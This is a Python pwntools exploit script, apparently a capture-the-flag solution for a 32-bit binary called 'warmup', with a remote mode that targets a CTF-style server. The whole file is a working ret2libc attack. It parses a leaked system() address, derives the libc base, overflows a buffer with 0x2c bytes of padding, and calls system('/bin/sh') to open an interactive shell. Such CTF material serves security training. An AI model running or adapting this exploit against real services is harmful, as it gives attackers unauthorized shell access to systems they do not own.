#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./warmup')

if args.REMOTE:
	p = remote('pwnremote.threatsims.com', 9000)
	libc = ELF('./libc6_2.31-0ubuntu9.2_i386.so')
else:
	p = process(binary.path)
	libc = ELF('/lib/i386-linux-gnu/libc.so.6')

p.recvuntil('system @ ')
system = int(p.recvline().strip(),16)
log.info('system: ' + hex(system))
libc.address = system - libc.sym.system
log.info('libc.address: ' + hex(libc.address))

payload  = b''
payload += 0x2c * b'A'
payload += p32(system)
payload += p32(0)
payload += p32(next(libc.search(b'/bin/sh')))

p.sendlineafter('> ',payload)
p.interactive()
